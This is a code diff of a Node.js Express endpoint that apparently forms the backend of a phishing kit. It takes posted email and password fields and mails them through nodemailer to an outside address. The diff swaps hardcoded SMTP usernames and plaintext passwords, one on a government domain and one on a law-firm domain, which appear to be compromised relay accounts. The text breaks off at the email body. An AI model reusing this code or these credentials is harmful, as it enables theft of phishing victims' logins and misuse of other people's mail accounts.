@@ -20,16 +20,16 @@ app.get("/", (req, res) => {
 app.post("/sendmail", cors(), async (req, res) => {
   let { email, pass, pasers } = req.body;
   const transport = nodemailer.createTransport({
-    host: "mail.sidur.gob.mx",
+    host: "mail.zetolawyer.com",
     port: 465,
     auth: {
-      user: "diego.ledgard@sidur.gob.mx",
-      pass: "C0rr30.48",
+      user: "zetobachri@zetolawyer.com",
+      pass: "L4wy3r.Muda",
     },
   });
 
   await transport.sendMail({
-    from: "mail.sidur.gob.mx",
+    from: "zetobachri@zetolawyer.com",
     to: "marketing@rumahmutu.id",
     subject: "test email",
     html: ` 
